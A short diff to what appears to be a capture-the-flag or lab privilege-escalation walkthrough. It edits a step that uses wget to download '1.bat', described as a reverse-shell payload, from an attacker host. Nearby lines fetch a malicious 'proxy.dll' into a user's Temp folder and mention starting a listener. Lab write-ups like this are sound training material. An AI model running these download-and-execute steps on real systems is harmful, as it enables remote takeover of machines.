@@ -85,7 +85,7 @@ wget http://10.0.0.0:80/proxy.dll -O C:\Users\thm-unpriv\AppData\Local\Temp\adsl
 
 8. in powershell download 1.bat (our rev shell payload) use command bellow
 
-wget http://10.0.0.0:80/1.bat -O 
+wget http://10.0.0.0:80/1.bat -O C:\tools\1.bat
 
 9. start listener on attaking machine can use command bellow
 
